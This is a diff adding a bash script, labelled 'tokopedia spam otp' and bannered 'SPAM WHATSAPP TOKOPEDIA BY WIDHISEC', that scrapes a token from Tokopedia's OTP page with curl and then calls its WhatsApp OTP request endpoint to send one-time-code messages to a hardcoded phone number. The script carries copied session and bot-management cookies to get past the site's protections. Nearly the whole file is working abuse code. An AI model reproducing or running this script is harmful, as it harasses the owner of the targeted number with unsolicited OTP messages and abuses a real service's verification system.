@@ -1,0 +1,30 @@
+#!/usr/bin/env bash
+# tokopedia spam otp with bash shell
+nomer='081250864129'
+coba(){
+ok=$(
+curl "https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn=${nomer}&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D28282882%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D" --silent \
+-H 'authority: accounts.tokopedia.com' \
+-H 'upgrade-insecure-requests: 1' \
+-H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36' \
+-H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3' \
+-H 'cookie: bm_sz=07314DEE91919B712918EF7FC763BDA0~YAAQlV1idrGezX5sAQAAqikGtQRDco/VZr57X+nCbxT26nE4vrtWVfZFiADOHLCuV8SD4Sf/vJCgqcNBKhXStJYUdhq50L+LcRMrlz6nyXJFcfuUmdnjgX5o4g40Dg57CFuqLkXKfMYS+MFGNcXYqp9BKcL0CFnf+EBjy2/uFgG6lXfRa/pFVJw1IlYKABdrCgCZ; _ga=GA1.2.1642474812.1566405177; _gid=GA1.2.1667290532.1566405177; ak_bmsc=F18D539DF63DBDB496BAFC63E5E3A45D76625D95965E000037725D5D09DE0230~plwBzEVY6BwU44tHIMU3UO3OjuacuQ2zOTWjMOXdt1dUEZHk7GimG1wrk3gOMOA4feSqi0HJHIboJwnXdZ93agJDMMNeekLBGtpcAS0HEslNGhjrgXi5yqt0uaWR7qn+jaIa2/Ocvz8AJOyLMLf/YBBv1U/IdFbCzZOKIZzRmzT/8KrhfP4UygVeaYSfCpO+gZcqlhtGFiAXhXDSaeNrBwKG01y8+GVXUD39kDCmjwa15cMmoBeSOdUrqX3+TAlWEQ; _hjid=f1ac4a60-3ff2-4971-b4b4-ad5ecfc2ecfb; _abck=18E40B1AD145333BE60DAE2C151F305D~0~YAAQlV1idr+fzX5sAQAApEEGtQKknv/5KT9PefcnpJ30w+mMBsOzBTYrhAqF7Hfgk0X6AxIbqxaWt5ib4t59Ws4woBGbA4+l+tEhhNp++FExkaEI/KIeygnIV2TXnD17dyM6rAQ8m8h3navHsICq6zUV/l8NmCtYNEIxZkZC09Vhoj+0uM+sUeGHx6PBOs8Fi8Hu7+OT6vTKWFBvH297MbVKinAwl2GwPaBuK8qmpdOryVrktaQIFYXJDbemXA1/jvzLqi9TvxQWIKs3bzk54OuDD5/bzD2fhq2UxilMrrv31iSwo3EF0lluW/E=~-1~-1~-1; zarget_visitor_info=%7B%7D; _SID_Tokopedia_=-ZKH00Ej7flMMUgxO2Jlfv1CJWbeQ7_HAz_d4E8NptNSxzcrL-tZFsjMAXWJ-twNBbT7SEj01nysD7m4vMDLyWOR41fW1Khko982QSF5jIuHvqa45ZFbhNOXFL3vAYuL; DID=bbd72f3998637b8d8857d075f1417180c24be756c5f9948d9835b8f7446720b42937cbad8c4722b316abff286722498f; isWebpSupport=true; _ID_autocomplete_=c959b5976b344aca916545fdbd4c00e1; state=eyJsZCI6Imh0dHBzOi8vd3d3LnRva29wZWRpYS5jb20vIiwicmVmIjoiaHR0cHM6Ly93d3cudG9rb3BlZGlhLmNvbS8iLCJ1dWlkIjoiZDVmYzJjOGQtZjRiMy00ODM1LTg4NzEtZmU5MWU4OTc5M2Q0IiwicCI6Imh0dHBzOi8vd3d3LnRva29wZWRpYS5jb20ifQ; _gcl_au=1.1.646525556.1566405216; __asc=8432e70916cb506d5f7ae31822b; __auc=8432e70916cb506d5f7ae31822b; cto_lwid=529ad229-14b2-422d-889b-b19df6e6fc8a; _BID_TOKOPEDIA_=8093faa37a57c8acb2868dfc2cae0679; scs=%7B%22t%22%3A1%7D; ins-gaSSId=eaa61da7-7139-51df-33a7-5f2afbedac1d_1566405225; _fbp=fb.1.1566405225266.1318017482; _ga=GA1.3.1642474812.1566405177; _gid=GA1.3.1667290532.1566405177; ins-mig-done=1; _dc_gtm_UA-9801603-1=1; _gat=1; _gat_UA-9801603-1=1; bm_sv=9EA2EFB083D6362562457B33BAF4A879~LXnLSPY9v9X07WSjI6whcvc7mtkT9A3Y3kZ31d4WoXgFycBr+h27s9qPvGxkvrrAq87ppjwF7RJgT54sewmsYaIuKQg4QUK7cs0Xh2qU3yR13XpLMFCERQj15QoYmeC1U7LyYeK85Q4yagWDQUC3VjWkemNXG859Z1mWQE/jRn8=; insdrSV=4' \
+-H 'referer: https://www.tokopedia.com/register' --compressed|grep -Po '(?<=id="Token" value=")[^"]*')
+    gas=$(
+    curl 'https://accounts.tokopedia.com/otp/c/ajax/request-wa' --silent \
+    -H 'origin: https://accounts.tokopedia.com' \
+    -H 'x-requested-with: XMLHttpRequest' \
+    -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36' \
+    -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \
+    -H 'accept: application/json, text/javascript, */*; q=0.01' \
+    -H 'authority: accounts.tokopedia.com' \
+    -H 'cookie: bm_sz=07314DEE91919B712918EF7FC763BDA0~YAAQlV1idrGezX5sAQAAqikGtQRDco/VZr57X+nCbxT26nE4vrtWVfZFiADOHLCuV8SD4Sf/vJCgqcNBKhXStJYUdhq50L+LcRMrlz6nyXJFcfuUmdnjgX5o4g40Dg57CFuqLkXKfMYS+MFGNcXYqp9BKcL0CFnf+EBjy2/uFgG6lXfRa/pFVJw1IlYKABdrCgCZ; _ga=GA1.2.1642474812.1566405177; _gid=GA1.2.1667290532.1566405177; ak_bmsc=F18D539DF63DBDB496BAFC63E5E3A45D76625D95965E000037725D5D09DE0230~plwBzEVY6BwU44tHIMU3UO3OjuacuQ2zOTWjMOXdt1dUEZHk7GimG1wrk3gOMOA4feSqi0HJHIboJwnXdZ93agJDMMNeekLBGtpcAS0HEslNGhjrgXi5yqt0uaWR7qn+jaIa2/Ocvz8AJOyLMLf/YBBv1U/IdFbCzZOKIZzRmzT/8KrhfP4UygVeaYSfCpO+gZcqlhtGFiAXhXDSaeNrBwKG01y8+GVXUD39kDCmjwa15cMmoBeSOdUrqX3+TAlWEQ; _hjid=f1ac4a60-3ff2-4971-b4b4-ad5ecfc2ecfb; _abck=18E40B1AD145333BE60DAE2C151F305D~0~YAAQlV1idr+fzX5sAQAApEEGtQKknv/5KT9PefcnpJ30w+mMBsOzBTYrhAqF7Hfgk0X6AxIbqxaWt5ib4t59Ws4woBGbA4+l+tEhhNp++FExkaEI/KIeygnIV2TXnD17dyM6rAQ8m8h3navHsICq6zUV/l8NmCtYNEIxZkZC09Vhoj+0uM+sUeGHx6PBOs8Fi8Hu7+OT6vTKWFBvH297MbVKinAwl2GwPaBuK8qmpdOryVrktaQIFYXJDbemXA1/jvzLqi9TvxQWIKs3bzk54OuDD5/bzD2fhq2UxilMrrv31iSwo3EF0lluW/E=~-1~-1~-1; zarget_visitor_info=%7B%7D; _SID_Tokopedia_=-ZKH00Ej7flMMUgxO2Jlfv1CJWbeQ7_HAz_d4E8NptNSxzcrL-tZFsjMAXWJ-twNBbT7SEj01nysD7m4vMDLyWOR41fW1Khko982QSF5jIuHvqa45ZFbhNOXFL3vAYuL; DID=bbd72f3998637b8d8857d075f1417180c24be756c5f9948d9835b8f7446720b42937cbad8c4722b316abff286722498f; isWebpSupport=true; _ID_autocomplete_=c959b5976b344aca916545fdbd4c00e1; state=eyJsZCI6Imh0dHBzOi8vd3d3LnRva29wZWRpYS5jb20vIiwicmVmIjoiaHR0cHM6Ly93d3cudG9rb3BlZGlhLmNvbS8iLCJ1dWlkIjoiZDVmYzJjOGQtZjRiMy00ODM1LTg4NzEtZmU5MWU4OTc5M2Q0IiwicCI6Imh0dHBzOi8vd3d3LnRva29wZWRpYS5jb20ifQ; _gcl_au=1.1.646525556.1566405216; __asc=8432e70916cb506d5f7ae31822b; __auc=8432e70916cb506d5f7ae31822b; cto_lwid=529ad229-14b2-422d-889b-b19df6e6fc8a; _BID_TOKOPEDIA_=8093faa37a57c8acb2868dfc2cae0679; scs=%7B%22t%22%3A1%7D; ins-gaSSId=eaa61da7-7139-51df-33a7-5f2afbedac1d_1566405225; _fbp=fb.1.1566405225266.1318017482; _ga=GA1.3.1642474812.1566405177; _gid=GA1.3.1667290532.1566405177; ins-mig-done=1; _dc_gtm_UA-9801603-1=1; _gat=1; _gat_UA-9801603-1=1; bm_sv=9EA2EFB083D6362562457B33BAF4A879~LXnLSPY9v9X07WSjI6whcvc7mtkT9A3Y3kZ31d4WoXgFycBr+h27s9qPvGxkvrrAq87ppjwF7RJgT54sewmsYaIuKQg4QUK7cs0Xh2qU3yR13XpLMFCERQj15QoYmeC1U7LyYeK85Q4yagWDQUC3VjWkemNXG859Z1mWQE/jRn8=; insdrSV=4' --data "tk=$ok&otp_type=116&msisdn=${nomer}&email=&original_param=" --compressed
+    )
+    b="""
+    [ SPAM WHATSAPP TOKOPEDIA BY WIDHISEC ]
+    """
+    echo -e "${b}"
+    echo -e "$gas"
+}
+
+coba
